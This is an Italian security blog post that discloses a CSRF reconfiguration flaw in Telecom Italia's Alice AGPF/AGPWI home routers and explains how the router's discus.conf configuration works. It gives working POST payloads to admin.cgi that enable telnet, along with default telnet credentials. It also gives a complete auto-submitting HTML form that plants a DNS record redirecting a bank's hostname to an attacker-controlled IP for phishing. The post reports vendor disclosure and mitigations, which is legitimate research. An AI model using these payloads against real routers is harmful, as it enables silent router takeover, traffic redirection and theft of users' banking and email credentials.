> Questo post fa parte della serie di articoli sulla vulnerabilità CSRF dei router [Alice](http://disse.cting.org/tags/alice/), leggi l'[articolo introduttivo](http://disse.cting.org/2012/09/02/alice-gate-agpf-csrf-reconf-vulnerability).

> Aggiornamento 12/2012: La vulnerabilità CSRF è stata mitigata abilitando la richiesta di password per accedere al pannello di amministrazione. La tecnica per sbloccare le funzionalità nascoste del proprio router rimane comunque valida.

I router Alice Gate VoIP 2 Plus Wifi (AGPF) sono distribuiti dal 2008 mentre i router Adsl2+ Wi-Fi N (AGPWI) sono l'ultima serie distribuita dal 2012, e entrambi contano una vasta letteratura su metodi di sblocco via [ponticelli](http://www.ilpuntotecnicoeadsl.com/forum/index.php?topic=10572.0) hardware, [jtag](https://docs.google.com/viewer?a=v&q=cache:qazfuZuhblUJ:beghiero.myftp.org/mirror/ramponis/AGPF/AGPF%2520as%2520Hsdpa%2520gateway.pdf+&hl=it&gl=it&pid=bl&srcid=ADGEESi-YKQXIbbwVxKNHIfw4_JW4wVwQ5iW8ws6RhdiMWbTUpdMpr_D4Dpf6JNGCE8PRGsJAG4gSBc2hoLMRoqT2TQat_jNFf5F8Z4v9Q3SQN1AkUGlSQrjEEjnUYdW0LuGSb7p_GKL&sig=AHIEtbTg_MD3ETdnEPfJ93XMN3wB1ML_Nw&pli=1), trigger di backdoor via pacchetti su [rete](http://brainstormwhitehat.wordpress.com/2012/01/27/sblocco-router-telecom-adsl2-wi-fi-n-agpwi-senza-cacciaviti-e-ponticelli/) [locale](http://saxdax.altervista.org/wordpress/modem/sbloccare-i-modem-alice-senza-cacciaviti-seriali-o-ponticelli) allo scopo di sostituire il [firmware](http://wiki.ninux.org/Hackalicegate), sbloccare menu avanzati, personalizzare il [voip](http://www.ilpuntotecnicoeadsl.com/forum/index.php/topic,10807.0.html) e gli aspetti più disparati. 

Dei tanti metodi trovati per lo sblocco dei router, quello qui esposto è per ora il più immediato, poichè eseguibile con una semplice richiesta POST triggerata da una pagina HTML, per di più sfruttabile via attacco [CSRF]( #CSRF ).

# Sblocco


<blockquote class="blockwarn"><p><strong>Attenzione: le modifiche alla configurazione interna del router Alice Gate VoIP 2 Plus Wifi potrebbero essere vietate dal contratto stipulato con il provider, e apportare danni al router rendendolo inutilizzabile. Prima di effettuare qualsiasi modifica assicurarsi di saper ripristinare le impostazioni iniziali. Esegui i test dimostrativi a tuo rischio e pericolo.</strong></p> <p>Lo studio sulla sicurezza dell'apparato è da intendersi a scopo didattico. In caso possediate il router in oggetto apprestatevi subito a <a href="{{ get_url("/2012/09/02/alice-gate-agpf-csrf-reconf-vulnerability-details/") }}#mitigazione">mitigare</a> la vulnerabilità per proteggere la propria connessione casalinga in attesa di un aggiornamento da parte del distributore. L'autore non è responsabile di danni agli apparati o violazioni a sistemi informatici derivanti dall'uso delle tecniche esposte. Ricordo che l'accesso abusivo ad un sistema informatico e perseguibile secondo l'articolo 615-ter del codice penale.
</p></blockquote>

I router AGPF e AGPWI prodotti dalla Pirelli Broadband Solution/ADB BROADBAND e distribuiti dalla Telecom sotto i rispettivi nomi di Gate VoIP 2 Plus Wifi e Adsl2+ Wi-Fi N, monta un kernel Linux con middleware [openrg](http://www.jungo.com/openrg/news/pr071009b.html) per la gestione di gateway, servizi, interfacce utente, etc. Il *cuore* del sistema è descritto dal file di configurazione `discus.conf`, derivato dal `openrg.conf` dei sistemi openrg vanilla, descritto da una sintassi particolare come si notare da alcuni [file](http://beghiero.myftp.org/modifiche/Discus2.conf) pubblicati in rete. 

La tecnica HTTP POST è impiegata per sbloccare funzionalità nascoste sul router nel [dimostratore]( http://disse.cting.org/codes/alice.html ) che ho pubblicato.

## Discus.conf

Il file `discus.conf` controlla ogni aspetto della configurazione del sistema Linux/opernrg installato sul router, come si evince dalle categorie principali delle opzioni configurabili:  

~~~ { lisp }

(openrg
  (dev())
  (admin())
  (system())
  (wbm())
  (syslog())
  (dns())
  (disk())
  (fs())
  (print_server())
  (service())
  (fw())
  (rip())
  (mcast())
  (rmt_upd())
  (voip())
  (enotify())
  (email())
  (radius())
  (cwmp())
  (manufacturer())
  (cert())
  (ssh())
  (upnp())
  (pppoe_relay())
  (qos())
  (network())
  (internal())
  (modem())
  (themanager())
)

~~~

Si accede alle singole voci specificando il path: ci si riferisce per esempio alla terza entry DNS presente in `(dns(entry(3(...)))` con il path `dns/entry/3`. Ogni modifica effettuata alla configurazione scatena una procedura di allineamento del sistema alla configurazione attuale. Ad esempio la modifica del path `admin/telnets/ports` per aprire una nuova porta triggera l'avvio del telnetd, la modifica delle regole del firewall, etc.
 
Sapendo cosa cercare in giro per *l'internet* si trovano i manuali sulla configurazione del `discus.conf` e l'intero sistema: un utilissimo [manuale](ftp://ftp.on4hu.be/Sagem-B-box2/openrg_configuration_guide.pdf) che descrive **ogni campo** del file di configurazione, una [guida](http://theindexof.net/download/2notep/openrg_programmer_guide.pdf) alla programmazione e all'utilizzo.


## Il parametro HTTP stack_set

L'interfaccia web accessibile all'indirizzo [http://192.168.1.1](http://192.168.1.1), espone alcune pagine per configurare e visionare lo stato del router. Gli aspetti configurabili via interfaccia web sono limitati a poche voci quali port forwarding, QoS, dns dinamico e poco altro: una piccola parte rispetto alla configurazione reale descritta dal file `discus.conf` vista sopra. 

Le pagine che modificano campi multipli, ad esempio il port forwarding, eseguono una richiesta HTTP POST al file CGI [/admin.cgi](http://192.168.1.1/admin.cgi) particolare come in questo esempio:

~~~ { php }

/admin.cgi?active_page=9130&page_title=Alice - Info&mimic_button_field=submit_button_avanti: avanti..&button_value=attiva&strip_page_top=0&stack_set=(stack_set
  (0
    (path(fw/rule/loc_srv))
    (index(-1))
    (set
      (-1
        (services
          (0
            (name(de))
            (trigger
              (0
                (protocol(6))
                (dst
                  (start(90))
                  (end(90))
                )
              )
              (1
                (protocol(17))
                (dst
                  (start(90))
                  (end(90))
                )
              )
            )
          )
        )
        (enabled(1))
      )
    )
  )
)
~~~

Il parametro POST `stack_set` contiene intere parti di configurazione che vengono scritte sul file `discus.conf` interno. Interpretando la sintassi si può tentare la modifica di un path diverso da quello dalla richiesta originale. Il parametro `active_page` cambia da versione a versione di AGPF e AGPWI, ma il formato della richiesta rimane identica. Per prova, cambiamo il path `admin/telnets/disabled` da `1` a `0` in modo da attivare il servizio telnet:

~~~ { php }

/admin.cgi?active_page=9130&page_title=Alice - Info&mimic_button_field=submit_button_avanti: avanti..&button_value=attiva&strip_page_top=0&stack_set=(set
  (0
    (path(admin/telnets/disabled))
    	(set(disabled(0)))
  )
)
~~~

E la porta telnet è aperta. Colleghiamoci alla porta 23 con il comando `telnet 192.168.1.1` utilizzando come username *admin* e come password *riattizzati*. Con il comando `help` si vedono i comandi disponibili, e con `system shell` si spawna una shell busybox nel Linux installato. Suggerisco di aprire le interfacce di amministrazione principali quali telnet e menù avanzato di amministrazione per poi gestire comodatemente le altre configurazioni senza dover fare POST request ogni volta. 

<h1 id="CSRF"> CSRF </h1>

La tecnica di riconfigurazione descritta sopra via semplice richiesta POST si presta perfettamente ad un attacco [CSRF](http://it.wikipedia.org/wiki/Cross-site_request_forgery) con cui forzare il browser di un utente vittima a effettuare una richiesta volta a prendere il controllo del suo router. Le condizioni necessarie a un attacco sono abilitate di default:

- Nessuna autenticazione è richiesta per accedere all'interfaccia web
- Nessun token anti CSRF è utilizzato

E' quindi sufficiante forgiare una pagina web e farci accedere il malcapitato per effettuare un qualsiasi attacco come quelli descritti nell'[articolo]({{ get_url("/2012/09/02/alice-gate-agpf-csrf-reconf-vulnerability") }}) introduttivo. Intercettare le connessioni sottraendo le credenziali di mail, siti social, home banking etc. è uno degli attacchi più semplici da effettuare: poichè gli host collegati alla rete interna del router utilizzano come DNS server il router stesso, è sufficiente aggiungere una entry per deviare le connessioni verso un sito clone, o un reverse proxy, con cui raccogliere le credenziali degli utenti vulnerabili. 

Vediamo come preparare una pagina HTML, che quando visualizzata da un utente vulnerabile configura il router in modo che rediriga tutte le connessioni successive a *www.mybank.com* verso *disse.cting.org*, questo blog.

~~~ { php }
(stack_set
  (0
    (path(dns/entry))
    (index(-1))
    (set
      (-1
        (ip(109.168.126.241))
        (hostname(www.mybank.com))
      )
    )
  )
)
~~~

Una volta assicurati che la richiesta POST è corretta (attenzione, richieste sbagliate potrebbero corrompere il file di configurazione e rendere il modem inutilizzabile) prepariamo il form per l'autoesecuzione del CSRF:

~~~ { html }

<FORM action="http://192.168.1.1/admin.cgi" method="post">
<INPUT type=HIDDEN name="active_page" value="9130">
<INPUT type=HIDDEN name="page_title" value="Alice - Info">
<INPUT type=HIDDEN name="mimic_button_field" value="submit_button_avanti: avanti..">
<INPUT type=HIDDEN name="button_value" value="attiva">
<INPUT type=HIDDEN name="strip_page_top" value="0">
<INPUT type=HIDDEN name="stack_set" value="(stack_set
  (0
    (path(dns/entry))
    (index(-1))
    (set
      (-1
        (ip(109.168.126.241))
        (hostname(www.mybank.com))
      )
    )
  )
)
">
</FORM>
<SCRIPT>
window.onload = function(){ document.forms[0].submit(); }
</SCRIPT>
~~~

Un browser che apra questa pagina automaticamente farà un submit del form aggiungendo nel path path `dns` del `discus.conf` il record malevolevolo, con ovvie possibilità di phishing e sottrazione delle credenziali di *www.mybank.com*. Gli altri attacchi descritti nell'[articolo introduttivo]({{ get_url("/2012/09/02/alice-gate-agpf-csrf-reconf-vulnerability/") }}) sono ugualmente semplici da effettuare, e molti implementati nella pagina del [dimostratore]( {{ base_url }}/codes/alice.html ). 
 
<h2 id="mitigazione"> Mitigazione </h2>

Ho contattato Telecom Italia un mese fa, offrendo la analisi tecnica della vulnerabilità e il dimostratore per facilitarne lo studio. Per risolvere il problema il fix ufficiale dovrebbe: 

- Sanificare l'input inviato dall'utente con la variabile HTTP post, evitando la riscrittura del file di configurazione via richista HTTP 
- Implementando anti CSRF token per ogni form
- Abilitando di default l'autenticazione alla interfaccia web

I primi due punti non sono applicabili dall'utente poichè il CGI vulnerabile è compilato in un binario che gestisce l'interfaccia web. Il terzo fix non risolve la situazione ma limita i casi in cui l'attacco CSRF può andare a segno. Questo metodo ed altre protezioni da abilitare in attesa che venga rilasciato il fix ufficiale sono spiegati nella sezione per mitigare la vulnerabilità pubblicata nel [dimostratore]( {{ base_url }}/codes/alice.html ).
